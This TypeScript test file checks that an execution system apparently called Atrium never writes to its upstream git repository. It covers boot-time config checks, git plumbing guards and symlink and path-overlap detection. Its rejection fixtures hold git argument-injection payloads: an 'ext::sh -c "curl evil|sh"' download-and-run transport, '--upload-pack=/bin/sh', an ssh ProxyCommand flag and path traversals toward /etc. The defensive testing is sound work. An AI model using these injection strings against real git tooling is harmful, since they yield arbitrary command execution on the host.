import { execFile } from 'node:child_process';
import { mkdir, mkdtemp, readFile, rm, symlink, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { promisify } from 'node:util';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { loadEnv } from '../../src/env.js';
import { executionUpstream } from '../../src/execution/configure.js';
import {
  ARTIFACT_REPO_AT_UPSTREAM_REFUSAL,
  type ArtifactRepo,
  addWorktree,
  commitWorktree,
  createArtifactRepo,
  createScratchRepo,
  disposeScratchRepo,
  mainCommit,
  PUSH_INTO_UPSTREAM_REFUSAL,
  pushArtifactBranch,
  removeWorktree,
  type ScratchRepo,
  UPSTREAM_ARTIFACT_REMOTE_REFUSAL,
} from '../../src/execution/git.js';
import { createDeterministicShimProvider } from '../../src/execution/shim.js';
import {
  isAcceptableUpstreamUrl,
  pathsOverlap,
  UPSTREAM_REF_REFUSAL,
  UPSTREAM_UNPARSEABLE_URL_REFUSAL,
  UPSTREAM_URL_REFUSAL,
  upstreamLocalPath,
} from '../../src/execution/upstream.js';
import { createWorktreeCommandProvider } from '../../src/execution/worktree-provider.js';

/**
 * REAL-REPO EXECUTION MODE (#141) — the guard witnesses.
 *
 * The headline invariant is ONE sentence — THE UPSTREAM IS NEVER WRITTEN — and
 * it is enforced at three layers, because a guard present on one layer and
 * absent on the adjacent one is the #89 adjacent-path-bypass class:
 *
 *   config    `env.ts`               → the dangerous wiring will not BOOT
 *   plumbing  `git.ts`/`upstream.ts` → the dangerous OPERATION refuses
 *   provider  `shim`/`worktree`      → the dangerous PROVIDER will not BUILD
 *
 * ## Why the disjointness table exists
 *
 * The campaign's recurring defect is not a missing guard, it is a SHARED
 * REFUSAL SENTENCE: two guards throw messages that both satisfy one witness's
 * regex, so the witness passes with guard B reverted because guard A caught the
 * fixture instead. It has fired four times. So every refusal in this seam gets
 * its own sentence, and `GUARDS` below is checked two ways — pairwise disjoint
 * as strings, and each fixture's thrown message matches EXACTLY ONE probe.
 * Revert any single guard and its case reds on "expected a throw", never on
 * somebody else's message.
 */

const run = promisify(execFile);

/** A real git repo with a known file — the stand-in for "this repo". */
async function makeUpstream(file = 'KEEP.txt', body = 'the file a session deletes\n') {
  const dir = await mkdtemp(join(tmpdir(), 'atrium-upstream-'));
  await run('git', ['init', '-q', '-b', 'main'], { cwd: dir });
  await writeFile(join(dir, file), body);
  await writeFile(join(dir, 'untouched.txt'), 'stays exactly as it is\n');
  await run('git', ['add', '-A'], { cwd: dir });
  await run(
    'git',
    ['-c', 'user.name=up', '-c', 'user.email=up@up', 'commit', '-q', '-m', 'upstream seed'],
    { cwd: dir },
  );
  const { stdout } = await run('git', ['rev-parse', 'HEAD'], { cwd: dir });
  return { dir, commit: stdout.trim(), file };
}

/**
 * A content hash of every file under `dir` — the byte-identity measure the
 * invariant is stated in. Paths AND contents, sorted, so a new file, a deleted
 * file, or a changed byte all move it.
 */
async function fingerprint(dir: string): Promise<string> {
  const { stdout } = await run('bash', [
    '-c',
    `cd ${JSON.stringify(dir)} && find . -type f -print0 | LC_ALL=C sort -z | xargs -0 sha256sum | sha256sum`,
  ]);
  return stdout.trim();
}

/* ═══════════════════════════════════════════════════════════════════════════
 * THE DISJOINTNESS TABLE — one row per guard, one probe per row.
 * ═══════════════════════════════════════════════════════════════════════════ */

interface Guard {
  readonly id: string;
  readonly layer: 'config' | 'plumbing' | 'provider';
  /** A fragment that appears in THIS guard's refusal and no other's. */
  readonly probe: RegExp;
}

const GUARDS: readonly Guard[] = [
  { id: 'config/url-missing', layer: 'config', probe: /reads as live and does nothing/ },
  { id: 'config/ref-missing', layer: 'config', probe: /will not guess which commit/ },
  { id: 'config/wrong-provider', layer: 'config', probe: /would be silently inert/ },
  { id: 'config/url-shape', layer: 'config', probe: /is not a repository and is refused/ },
  {
    id: 'config/write-overlap',
    layer: 'config',
    probe: /refused at boot rather than discovered afterwards/,
  },
  {
    id: 'plumbing/ref-shape',
    layer: 'plumbing',
    probe: /not a well-formed, option-free git ref name/,
  },
  {
    id: 'plumbing/url-as-option',
    layer: 'plumbing',
    probe: /resolve as a flag, an ext:: transport/,
  },
  {
    id: 'plumbing/artifact-repo-at-upstream',
    layer: 'plumbing',
    probe: /would modify the very repository a session forks from/,
  },
  {
    id: 'plumbing/push-into-upstream',
    layer: 'plumbing',
    probe: /a human FETCHES from the provider-owned repo/,
  },
  {
    id: 'provider/artifact-remote',
    layer: 'provider',
    probe: /without a durable artifact remote distinct from the upstream/,
  },
  // ── Round 2 (#141 r2) ─────────────────────────────────────────────────────
  {
    // The honest boundary. Not a guard on a WRITE — a refusal of the whole MODE
    // on the one provider where the claim cannot be kept.
    id: 'config/unsandboxed-worktree',
    layer: 'config',
    probe: /real-repo mode is unavailable under the UNSANDBOXED worktree/,
  },
  {
    // One sentence, thrown by `upstreamLocalPath`, which binds at BOTH the
    // config layer (via `assertExecutionUpstreamSafe`) and the plumbing
    // (`createArtifactRepo`, `assertArtifactRemoteIsNotUpstream`). It is one
    // guard used twice, not two guards sharing a sentence — the trap the table
    // exists for is the opposite case.
    id: 'plumbing/unparseable-url',
    layer: 'plumbing',
    probe: /an unreadable location is not evidence that it is remote/,
  },
];

/**
 * Assert a refusal is THIS guard's and nobody else's. The second half is the
 * anti-shared-sentence check: if another guard's message also matched, the
 * witness would be proving the wrong thing.
 */
function expectExactlyGuard(message: string, id: string): void {
  const matched = GUARDS.filter((guard) => guard.probe.test(message)).map((guard) => guard.id);
  expect(matched, `message did not match exactly one guard probe:\n${message}`).toEqual([id]);
}

describe('#141 refusal sentences are pairwise disjoint', () => {
  it("no guard probe matches another guard's shipped refusal string", () => {
    const shipped: Array<[string, string]> = [
      ['plumbing/ref-shape', UPSTREAM_REF_REFUSAL],
      ['plumbing/url-as-option', UPSTREAM_URL_REFUSAL],
      ['plumbing/artifact-repo-at-upstream', ARTIFACT_REPO_AT_UPSTREAM_REFUSAL],
      ['plumbing/push-into-upstream', PUSH_INTO_UPSTREAM_REFUSAL],
      ['provider/artifact-remote', UPSTREAM_ARTIFACT_REMOTE_REFUSAL],
      ['plumbing/unparseable-url', UPSTREAM_UNPARSEABLE_URL_REFUSAL],
    ];
    for (const [id, sentence] of shipped) expectExactlyGuard(sentence, id);
    // And no two shipped sentences are the same string, which is the trap in its
    // crudest form.
    const sentences = shipped.map(([, sentence]) => sentence);
    expect(new Set(sentences).size).toBe(sentences.length);
  });

  it('covers every layer the invariant is restated at', () => {
    expect(new Set(GUARDS.map((g) => g.layer))).toEqual(
      new Set(['config', 'plumbing', 'provider']),
    );
  });
});

/* ═══════════════════════════════════════════════════════════════════════════
 * LAYER 1 — CONFIG. The dangerous wiring does not boot.
 * ═══════════════════════════════════════════════════════════════════════════ */

describe('THE UPSTREAM IS NEVER WRITTEN — config layer (#141, red-on-revert)', () => {
  const BASE = {
    DATABASE_URL: 'postgres://atrium:atrium@localhost:5432/atrium',
    NODE_ENV: 'development',
  } as const;

  /** Load and capture the boot refusal, failing loudly if it booted instead. */
  function refusal(source: Record<string, string>): string {
    try {
      loadEnv(source);
    } catch (error) {
      return (error as Error).message;
    }
    return expect.unreachable('expected loadEnv to refuse this environment') as never;
  }

  it('refuses a REF with no URL to fetch it from', () => {
    // REVERT-REDS: delete the `url === undefined` arm of
    // `assertExecutionUpstreamSafe` and this boots with real-repo config that
    // does nothing at all.
    expectExactlyGuard(
      refusal({
        ...BASE,
        EXECUTION_PROVIDER: 'shim',
        EXECUTION_SCRATCH_DIR: '/tmp/atrium-scratch-141',
        EXECUTION_UPSTREAM_REF: 'main',
      }),
      'config/url-missing',
    );
  });

  it('refuses a URL with no REF, rather than defaulting to main', () => {
    // REVERT-REDS: give EXECUTION_UPSTREAM_REF a `.default('main')` and this
    // boots — and every session then produces a diff against a commit nobody
    // named, which is the plausible-and-wrong failure the ticket is about.
    expectExactlyGuard(
      refusal({
        ...BASE,
        EXECUTION_PROVIDER: 'shim',
        EXECUTION_SCRATCH_DIR: '/tmp/atrium-scratch-141',
        EXECUTION_UPSTREAM_URL: '/srv/atrium',
      }),
      'config/ref-missing',
    );
  });

  it('refuses an upstream under a provider that seeds no scratch trunk', () => {
    // REVERT-REDS: drop the provider check and the sandbox seam accepts an
    // upstream it never reads — configuration that looks live and is inert.
    expectExactlyGuard(
      refusal({
        ...BASE,
        EXECUTION_PROVIDER: 'sandbox',
        EXECUTION_UPSTREAM_URL: '/srv/atrium',
        EXECUTION_UPSTREAM_REF: 'main',
      }),
      'config/wrong-provider',
    );
  });

  it('refuses an upstream configured with execution DISABLED', () => {
    // The early-return hole: `EXECUTION_PROVIDER` unset used to short-circuit the
    // whole function, so real-repo config against a disabled provider sailed
    // through. REVERT-REDS: move `assertExecutionUpstreamSafe` back below the
    // `EXECUTION_PROVIDER === undefined` return and this boots silently.
    expectExactlyGuard(
      refusal({ ...BASE, EXECUTION_UPSTREAM_URL: '/srv/atrium', EXECUTION_UPSTREAM_REF: 'main' }),
      'config/wrong-provider',
    );
  });

  it.each([
    ['a leading dash git reads as a flag', '--upload-pack=/bin/sh'],
    ['an ext:: transport that names a command', 'ext::sh -c "curl evil|sh"'],
    ['a cwd-relative path', 'some/relative/repo'],
    ['an scp-style host:path', 'git@github.com:lmvdz/atrium.git'],
  ])('refuses %s as an upstream location', (_name, url) => {
    // REVERT-REDS: replace `isAcceptableUpstreamUrl`'s allowlist with a denylist
    // of the two forms someone remembered, and the other two board.
    expectExactlyGuard(
      refusal({
        ...BASE,
        EXECUTION_PROVIDER: 'shim',
        EXECUTION_SCRATCH_DIR: '/tmp/atrium-scratch-141',
        EXECUTION_UPSTREAM_URL: url,
        EXECUTION_UPSTREAM_REF: 'main',
      }),
      'config/url-shape',
    );
  });

  it.each([
    ['the scratch dir IS the upstream', 'EXECUTION_SCRATCH_DIR', '/srv/atrium'],
    ['the scratch dir is INSIDE the upstream', 'EXECUTION_SCRATCH_DIR', '/srv/atrium/.atrium'],
    ['the artifact dir IS the upstream', 'EXECUTION_ARTIFACT_DIR', '/srv/atrium'],
    ['the artifact dir is INSIDE the upstream', 'EXECUTION_ARTIFACT_DIR', '/srv/atrium/.git/x'],
    ['the upstream is inside the scratch dir', 'EXECUTION_SCRATCH_DIR', '/srv'],
    ['an unnormalised spelling of the same dir', 'EXECUTION_SCRATCH_DIR', '/srv/other/../atrium'],
  ])('refuses at boot when %s', (_name, key, value) => {
    // REVERT-REDS: weaken `pathsOverlap` to `left === right` and the four
    // containment cases board — an artifact repo INSIDE the upstream writes it
    // just as surely as one AT it.
    expectExactlyGuard(
      refusal({
        ...BASE,
        EXECUTION_PROVIDER: 'shim',
        EXECUTION_SCRATCH_DIR: '/tmp/atrium-scratch-141',
        EXECUTION_UPSTREAM_URL: '/srv/atrium',
        EXECUTION_UPSTREAM_REF: 'main',
        [key]: value,
      }),
      'config/write-overlap',
    );
  });

  /* ── FIX 1 (#141 r2): THE HONEST BOUNDARY ────────────────────────────────
   *
   * The overlap guards protect Atrium's own paths, unconditionally. They do not
   * — and cannot — protect against the worktree provider's HARNESS, which is
   * arbitrary local code that can write `url.<upstream>.pushInsteadOf` into the
   * worktree's git config and thereby redirect the adapter's own later push
   * into the upstream. The argv never changes, so no path check sees it. The
   * resolution is to scope the CLAIM, not to add a seventh guard that also
   * cannot see it: real-repo mode is refused on that provider outright.
   */
  const WORKTREE_BASE = {
    ...BASE,
    EXECUTION_PROVIDER: 'worktree',
    EXECUTION_SCRATCH_DIR: '/tmp/atrium-scratch-141',
    EXECUTION_ARTIFACT_DIR: '/tmp/atrium-artifacts-141',
    EXECUTION_HARNESS_COMMAND: '["bash","-lc","true"]',
    EXECUTION_ALLOW_UNSANDBOXED: '1',
  } as const;

  it('refuses real-repo mode under the UNSANDBOXED worktree provider, naming #138', () => {
    // REVERT-REDS: delete the `EXECUTION_PROVIDER === 'worktree'` arm of
    // `assertExecutionUpstreamSafe` and this boots — and then the documented
    // "the upstream is never written" is a claim the deployment cannot keep,
    // because its harness can rewrite the push destination out from under every
    // guard in this file.
    const message = refusal({
      ...WORKTREE_BASE,
      EXECUTION_UPSTREAM_URL: '/srv/atrium',
      EXECUTION_UPSTREAM_REF: 'main',
    });
    expectExactlyGuard(message, 'config/unsandboxed-worktree');
    // The refusal must name the unblock, or an operator reads it as "never".
    expect(message).toContain('#138');
    expect(message).toContain('EXECUTION_PROVIDER=shim');
  });

  it('leaves the worktree provider bootable with NO upstream — the flip', () => {
    // The boundary is on real-repo MODE, not on the provider. #120's unsandboxed
    // opt-in seam is untouched.
    expect(() => loadEnv({ ...WORKTREE_BASE })).not.toThrow();
  });

  it('leaves the shim provider bootable WITH an upstream — the other flip', () => {
    // The shim runs no harness command, so nothing can write a git config and
    // the claim holds there. Scoping is not banning.
    expect(() =>
      loadEnv({
        ...BASE,
        EXECUTION_PROVIDER: 'shim',
        EXECUTION_SCRATCH_DIR: '/tmp/atrium-scratch-141',
        EXECUTION_UPSTREAM_URL: '/srv/atrium',
        EXECUTION_UPSTREAM_REF: 'main',
      }),
    ).not.toThrow();
  });

  /* ── FIX 2 (#141 r2): the overlap guards stop being purely lexical ───────── */

  it.each([
    ['an IPv4 loopback host', 'file://127.0.0.1/srv/atrium'],
    ['an IPv6 loopback host', 'file://[::1]/srv/atrium'],
    ['the localhost alias', 'file://localhost/srv/atrium'],
    ['no host at all', 'file:///srv/atrium'],
    ['a trailing slash', 'file:///srv/atrium/'],
    ['an uppercase scheme', 'FILE:///srv/atrium'],
    ['an unnormalised path', 'file:///srv/other/../atrium'],
  ])('sees the write overlap through a file:// URL with %s', (_name, url) => {
    // REVERT-REDS: restore `upstreamLocalPath`'s `catch { return null }` and the
    // loopback-host rows BOOT — `fileURLToPath` throws ERR_INVALID_FILE_URL_HOST
    // on every one of them, the null read as "remote, no overlap question", and
    // the scratch dir is the upstream. Executed, not reasoned: git resolves
    // `file://127.0.0.1/srv/atrium` to the local directory.
    expectExactlyGuard(
      refusal({
        ...BASE,
        EXECUTION_PROVIDER: 'shim',
        EXECUTION_SCRATCH_DIR: '/srv/atrium',
        EXECUTION_UPSTREAM_URL: url,
        EXECUTION_UPSTREAM_REF: 'main',
      }),
      'config/write-overlap',
    );
  });

  it('treats a file:// URL naming a DIFFERENT host as genuinely remote', () => {
    // The other direction of the same fix: a non-loopback host is somebody
    // else's filesystem, so there is no local overlap to find and this must
    // still boot. Fail-closed is not fail-always.
    expect(() =>
      loadEnv({
        ...BASE,
        EXECUTION_PROVIDER: 'shim',
        EXECUTION_SCRATCH_DIR: '/srv/atrium',
        EXECUTION_UPSTREAM_URL: 'file://build-box.example.com/srv/atrium',
        EXECUTION_UPSTREAM_REF: 'main',
      }),
    ).not.toThrow();
  });

  it('refuses a file:// URL it cannot canonicalise instead of calling it remote', () => {
    // `%2F` is an ENCODED separator: node refuses to turn it into a path, git
    // decodes it. Two readers, two answers — so neither reading is trusted.
    // REVERT-REDS: return null instead of throwing and this boots with all four
    // overlap checks silently disabled.
    expectExactlyGuard(
      refusal({
        ...BASE,
        EXECUTION_PROVIDER: 'shim',
        EXECUTION_SCRATCH_DIR: '/tmp/atrium-scratch-141',
        EXECUTION_UPSTREAM_URL: 'file:///srv/atrium%2F..%2Fetc',
        EXECUTION_UPSTREAM_REF: 'main',
      }),
      'plumbing/unparseable-url',
    );
  });

  it('refuses a case-equivalent spelling of the upstream', () => {
    // On a case-insensitive filesystem these are ONE directory and the lexical
    // comparison sees two. REVERT-REDS: drop the case-folded arm of
    // `pathsOverlap` and this boots.
    expectExactlyGuard(
      refusal({
        ...BASE,
        EXECUTION_PROVIDER: 'shim',
        EXECUTION_SCRATCH_DIR: '/srv/Atrium/scratch',
        EXECUTION_UPSTREAM_URL: '/srv/atrium',
        EXECUTION_UPSTREAM_REF: 'main',
      }),
      'config/write-overlap',
    );
  });

  it('refuses an artifact dir that is a SYMLINK into the upstream', async () => {
    // The lexical check compares two strings that genuinely do not overlap. The
    // filesystem disagrees, and `init --bare` follows the link.
    // REVERT-REDS: drop `canonicalize` from `pathsOverlap` and this boots, then
    // writes a bare repo inside the upstream on the very next start.
    const root = await mkdtemp(join(tmpdir(), 'atrium-141-symlink-'));
    try {
      const upstreamDir = join(root, 'upstream');
      await mkdir(join(upstreamDir, 'nested'), { recursive: true });
      const link = join(root, 'artifacts');
      await symlink(join(upstreamDir, 'nested'), link, 'dir');
      expectExactlyGuard(
        refusal({
          ...BASE,
          EXECUTION_PROVIDER: 'shim',
          EXECUTION_SCRATCH_DIR: join(root, 'scratch'),
          EXECUTION_ARTIFACT_DIR: link,
          EXECUTION_UPSTREAM_URL: upstreamDir,
          EXECUTION_UPSTREAM_REF: 'main',
        }),
        'config/write-overlap',
      );
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  });

  it('refuses a scratch dir whose not-yet-created path hangs off a symlinked parent', async () => {
    // The dir does not exist yet — the server is about to create it — which is
    // why `canonicalize` walks up to the deepest EXISTING component. A guard
    // that only dereferenced paths that already exist would never fire at boot.
    const root = await mkdtemp(join(tmpdir(), 'atrium-141-symlink2-'));
    try {
      const upstreamDir = join(root, 'upstream');
      await mkdir(upstreamDir, { recursive: true });
      const link = join(root, 'link-to-upstream');
      await symlink(upstreamDir, link, 'dir');
      expectExactlyGuard(
        refusal({
          ...BASE,
          EXECUTION_PROVIDER: 'shim',
          EXECUTION_SCRATCH_DIR: join(link, 'not', 'created', 'yet'),
          EXECUTION_UPSTREAM_URL: upstreamDir,
          EXECUTION_UPSTREAM_REF: 'main',
        }),
        'config/write-overlap',
      );
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  });

  /* ── FIX 3 (#141 r2): the URL allowlist is PARSED, not prefix-matched ───── */

  it.each([
    ['a hostless https URL', 'https://'],
    ['a flag smuggled through the ssh authority', 'ssh://-oProxyCommand=evil/repo'],
    ['a query string on a file path', 'file:///srv/atrium?upload-pack=/bin/sh'],
    ['a fragment on a file path', 'file:///srv/atrium#frag'],
    ['a bare file:// with no path', 'file://'],
    ['an authority-shaped nonsense host', 'git://=weird=/repo'],
  ])('refuses %s as an upstream location', (_name, url) => {
    // REVERT-REDS: restore `isAcceptableUpstreamUrl` to
    // `UPSTREAM_URL_SCHEMES.some(s => url.startsWith(s))` and every one of these
    // boards — `ssh://-oProxyCommand=…` most of all, which is a command git runs.
    expectExactlyGuard(
      refusal({
        ...BASE,
        EXECUTION_PROVIDER: 'shim',
        EXECUTION_SCRATCH_DIR: '/tmp/atrium-scratch-141',
        EXECUTION_UPSTREAM_URL: url,
        EXECUTION_UPSTREAM_REF: 'main',
      }),
      'config/url-shape',
    );
  });

  it.each([
    ['a plain absolute path', '/srv/atrium'],
    ['an https URL', 'https://github.com/lmvdz/atrium.git'],
    ['an UPPERCASE scheme, which git accepts', 'HTTPS://github.com/lmvdz/atrium.git'],
    ['an ssh URL with a user and a port', 'ssh://git@github.com:22/lmvdz/atrium.git'],
    ['a git:// URL', 'git://github.com/lmvdz/atrium.git'],
    ['an http URL', 'http://internal.example/atrium.git'],
    ['a file URL', 'file:///srv/other/atrium'],
  ])('accepts %s', (_name, url) => {
    // The regression half. `HTTPS://…` was wrongly REFUSED by the prefix check;
    // a parse-based allowlist must not trade one false answer for another.
    expect(() =>
      loadEnv({
        ...BASE,
        EXECUTION_PROVIDER: 'shim',
        EXECUTION_SCRATCH_DIR: '/tmp/atrium-scratch-141',
        EXECUTION_UPSTREAM_URL: url,
        EXECUTION_UPSTREAM_REF: 'main',
      }),
    ).not.toThrow();
  });

  it('accepts a well-formed, non-overlapping real-repo configuration', () => {
    const env = loadEnv({
      ...BASE,
      EXECUTION_PROVIDER: 'shim',
      EXECUTION_SCRATCH_DIR: '/tmp/atrium-scratch-141',
      EXECUTION_ARTIFACT_DIR: '/tmp/atrium-artifacts-141',
      EXECUTION_UPSTREAM_URL: '/srv/atrium',
      EXECUTION_UPSTREAM_REF: 'main',
    });
    expect(executionUpstream(env)).toEqual({ url: '/srv/atrium', ref: 'main' });
  });

  it('reads NO upstream when neither half is set — the unchanged #120 seam', () => {
    const env = loadEnv({
      ...BASE,
      EXECUTION_PROVIDER: 'shim',
      EXECUTION_SCRATCH_DIR: '/tmp/atrium-scratch-141',
    });
    expect(executionUpstream(env)).toBeUndefined();
  });
});

/* ═══════════════════════════════════════════════════════════════════════════
 * LAYER 2 — PLUMBING. The dangerous operation refuses.
 * ═══════════════════════════════════════════════════════════════════════════ */

describe('THE UPSTREAM IS NEVER WRITTEN — git plumbing (#141, red-on-revert)', () => {
  let upstream: Awaited<ReturnType<typeof makeUpstream>>;
  const trash: string[] = [];

  beforeEach(async () => {
    upstream = await makeUpstream();
    trash.push(upstream.dir);
  });
  afterEach(async () => {
    while (trash.length > 0) {
      const dir = trash.pop();
      if (dir) await rm(dir, { recursive: true, force: true });
    }
  });

  it.each([
    ['an option', '--upload-pack=/bin/sh'],
    ['a refspec that writes a second local ref', 'main:refs/heads/evil'],
    ['a path traversal', 'refs/../../etc/passwd'],
    ['a whitespace-carrying value', 'main branch'],
    ['a .lock suffix git itself rejects', 'main.lock'],
  ])('refuses a seed whose ref is %s', async (_name, ref) => {
    // The seed is validated on the ONLY path that fetches, so a hand-built seed
    // gets the operator's refusal. REVERT-REDS: drop `assertUpstreamSeed` from
    // `createScratchRepo` and `--upload-pack=` reaches git's argv.
    const error = await createScratchRepo(undefined, { url: upstream.dir, ref }).then(
      (repo) => {
        trash.push(repo.dir);
        return null;
      },
      (e: Error) => e,
    );
    expect(error, `expected createScratchRepo to refuse ref ${ref}`).not.toBeNull();
    expectExactlyGuard((error as Error).message, 'plumbing/ref-shape');
  });

  it.each([
    ['a flag', '--upload-pack=/bin/sh'],
    ['an ext:: transport', 'ext::sh -c evil'],
    ['a relative path', 'relative/repo'],
  ])('refuses a seed whose location is %s', async (_name, url) => {
    // REVERT-REDS: remove the url arm of `assertUpstreamSeed` and the `--`
    // separator is the only thing left; drop that too and `--upload-pack` runs.
    const error = await createScratchRepo(undefined, { url, ref: 'main' }).then(
      (repo) => {
        trash.push(repo.dir);
        return null;
      },
      (e: Error) => e,
    );
    expect(error, `expected createScratchRepo to refuse url ${url}`).not.toBeNull();
    expectExactlyGuard((error as Error).message, 'plumbing/url-as-option');
  });

  it.each([
    ['AT the upstream', (dir: string) => dir],
    ['INSIDE the upstream', (dir: string) => join(dir, '.git', 'atrium-artifacts')],
    ['a parent OF the upstream', (dir: string) => join(dir, '..')],
  ])('refuses to open the durable artifact repo %s', async (_name, where) => {
    const before = await fingerprint(upstream.dir);
    // REVERT-REDS: drop the overlap check from `createArtifactRepo` and this
    // runs `init --bare` + two `config` writes against a real repository — a
    // BOOT-time write, before any session exists.
    const error = await createArtifactRepo(where(upstream.dir), {
      url: upstream.dir,
      ref: 'main',
    }).then(
      () => null,
      (e: Error) => e,
    );
    expect(error).not.toBeNull();
    expectExactlyGuard((error as Error).message, 'plumbing/artifact-repo-at-upstream');
    // Nothing was written on the way to refusing.
    expect(await fingerprint(upstream.dir)).toBe(before);
  });

  it('refuses to push a session branch into the upstream, even from a hand-built repo', async () => {
    // `createArtifactRepo` already refuses to BUILD such a repo — which is
    // exactly why the push re-checks. `ArtifactRepo` is a plain object; this is
    // the adjacent path a caller reaches without passing any boot gate.
    const scratch = await createScratchRepo(undefined, { url: upstream.dir, ref: 'main' });
    trash.push(scratch.dir);
    const checkout = await addWorktree(scratch, 'push-into-upstream');
    await writeFile(join(checkout.dir, 'session.txt'), 'work\n');
    await commitWorktree(checkout, 'session work');

    const before = await fingerprint(upstream.dir);
    const forged: ArtifactRepo = { dir: upstream.dir, upstreamPath: upstream.dir };
    // REVERT-REDS: remove the overlap check from `pushArtifactBranch` and this
    // push SUCCEEDS — `refs/heads/atrium/session/push-into-upstream` appears in
    // the human's repository and the fingerprint moves.
    await expect(pushArtifactBranch(checkout, forged)).rejects.toThrow(
      /a human FETCHES from the provider-owned repo/,
    );
    const message = await pushArtifactBranch(checkout, forged).catch((e: Error) => e.message);
    expectExactlyGuard(message as string, 'plumbing/push-into-upstream');
    expect(await fingerprint(upstream.dir)).toBe(before);

    await removeWorktree(checkout);
    await disposeScratchRepo(scratch);
  });

  it('seeds trunk FROM the upstream and leaves it byte-identical', async () => {
    const before = await fingerprint(upstream.dir);
    const scratch = await createScratchRepo(undefined, { url: upstream.dir, ref: 'main' });
    trash.push(scratch.dir);

    // Trunk IS the upstream commit — not a synthetic seed.
    expect(scratch.seedCommit).toBe(upstream.commit);
    expect(await mainCommit(scratch)).toBe(upstream.commit);
    expect(scratch.upstream).toEqual({ url: upstream.dir, ref: 'main', commit: upstream.commit });

    // A worktree forks the REAL tree: the upstream's file is there to be edited.
    const checkout = await addWorktree(scratch, 'seeded');
    expect(await readFile(join(checkout.dir, upstream.file), 'utf8')).toContain(
      'the file a session deletes',
    );
    // REVERT-REDS: restore `createScratchRepo` to always write README.atrium and
    // the upstream file is absent here — the ticket's whole complaint.
    await removeWorktree(checkout);
    expect(await fingerprint(upstream.dir)).toBe(before);
    await disposeScratchRepo(scratch);
  });

  it('leaves the empty-trunk seam EXACTLY as it was when no upstream is given (the flip)', async () => {
    const scratch = await createScratchRepo();
    trash.push(scratch.dir);
    expect(scratch.upstream).toBeUndefined();
    const checkout = await addWorktree(scratch, 'unseeded');
    expect(await readFile(join(checkout.dir, 'README.atrium'), 'utf8')).toContain(
      'Atrium execution scratch repo',
    );
    await removeWorktree(checkout);
    await disposeScratchRepo(scratch);
  });

  /* ── FIX 2 (#141 r2) at the PLUMBING layer ──────────────────────────────
   *
   * The config gate is a boot-time string comparison. These are the same two
   * defects reaching the operations themselves, which a hand-built seed gets to
   * without ever loading an env: `createArtifactRepo` is what runs
   * `init --bare` and two `config` writes at the destination.
   */

  it.each([
    ['an IPv4 loopback host', (dir: string) => `file://127.0.0.1${dir}`],
    ['an IPv6 loopback host', (dir: string) => `file://[::1]${dir}`],
    ['the localhost alias', (dir: string) => `file://localhost${dir}`],
    ['a trailing slash', (dir: string) => `file://${dir}/`],
    ['an uppercase scheme', (dir: string) => `FILE://${dir}`],
  ])('refuses to open the artifact repo at an upstream spelled with %s', async (_name, spell) => {
    const before = await fingerprint(upstream.dir);
    // EXECUTED, not argued: before this fix `upstreamLocalPath` returned null
    // for every loopback spelling and `createArtifactRepo` ran `init --bare`
    // straight into the upstream, moving the fingerprint below.
    const error = await createArtifactRepo(upstream.dir, {
      url: spell(upstream.dir),
      ref: 'main',
    }).then(
      () => null,
      (e: Error) => e,
    );
    expect(error, `expected a refusal for ${spell(upstream.dir)}`).not.toBeNull();
    expectExactlyGuard((error as Error).message, 'plumbing/artifact-repo-at-upstream');
    expect(await fingerprint(upstream.dir)).toBe(before);
  });

  it('refuses to open the artifact repo at a SYMLINK into the upstream', async () => {
    const before = await fingerprint(upstream.dir);
    const root = await mkdtemp(join(tmpdir(), 'atrium-141-plumbing-link-'));
    trash.push(root);
    const link = join(root, 'artifacts');
    await symlink(upstream.dir, link, 'dir');
    // REVERT-REDS: drop `canonicalize` from `pathsOverlap` and this `init --bare`
    // lands in the human's repository through the link.
    const error = await createArtifactRepo(link, { url: upstream.dir, ref: 'main' }).then(
      () => null,
      (e: Error) => e,
    );
    expect(error).not.toBeNull();
    expectExactlyGuard((error as Error).message, 'plumbing/artifact-repo-at-upstream');
    expect(await fingerprint(upstream.dir)).toBe(before);
  });

  it('refuses a file:// upstream it cannot canonicalise, rather than opening anywhere', async () => {
    const dir = await mkdtemp(join(tmpdir(), 'atrium-141-unparseable-'));
    trash.push(dir);
    const error = await createArtifactRepo(dir, {
      url: 'file:///srv/atrium%2F..%2Fetc',
      ref: 'main',
    }).then(
      () => null,
      (e: Error) => e,
    );
    expect(error).not.toBeNull();
    expectExactlyGuard((error as Error).message, 'plumbing/unparseable-url');
  });

  it('still opens the artifact repo normally beside a loopback-spelled upstream', async () => {
    // The flip. Canonicalising a loopback `file://` URL must find the overlap
    // when there is one and NOT invent one when there is not.
    const dir = await mkdtemp(join(tmpdir(), 'atrium-141-ok-'));
    trash.push(dir);
    const repo = await createArtifactRepo(dir, {
      url: `file://127.0.0.1${upstream.dir}`,
      ref: 'main',
    });
    expect(repo.dir).toBe(dir);
    // And it recorded the CANONICAL local path, so the push-time re-check has
    // something to compare against instead of `undefined`.
    expect(repo.upstreamPath).toBe(upstream.dir);
  });

  /* ── The pure functions, directly ──────────────────────────────────────── */

  it('canonicalises every local spelling of one directory to one path', () => {
    for (const spelling of [
      upstream.dir,
      `file://${upstream.dir}`,
      `file://127.0.0.1${upstream.dir}`,
      `file://[::1]${upstream.dir}`,
      `file://localhost${upstream.dir}`,
      `FILE://${upstream.dir}`,
      `file://${upstream.dir}/`,
      `${upstream.dir}/`,
    ]) {
      expect(upstreamLocalPath(spelling), spelling).toBe(upstream.dir);
    }
  });

  it('keeps a genuinely remote location remote, and refuses an unreadable one', () => {
    for (const remote of [
      'https://github.com/lmvdz/atrium.git',
      'ssh://git@github.com/lmvdz/atrium.git',
      'git://host/r',
      'file://build-box.example.com/srv/atrium',
    ]) {
      expect(upstreamLocalPath(remote), remote).toBeNull();
    }
    expect(() => upstreamLocalPath('file:///srv/atrium%2F..%2Fetc')).toThrow(
      /an unreadable location is not evidence that it is remote/,
    );
  });

  it('overlaps through a symlink and through case, and not otherwise', async () => {
    const root = await mkdtemp(join(tmpdir(), 'atrium-141-overlap-'));
    trash.push(root);
    const real = join(root, 'upstream');
    await mkdir(join(real, 'deep'), { recursive: true });
    const link = join(root, 'link');
    await symlink(join(real, 'deep'), link, 'dir');
    expect(pathsOverlap(link, real)).toBe(true);
    expect(pathsOverlap(join(link, 'artifacts'), real)).toBe(true);
    expect(pathsOverlap(`${real}/`, real)).toBe(true);
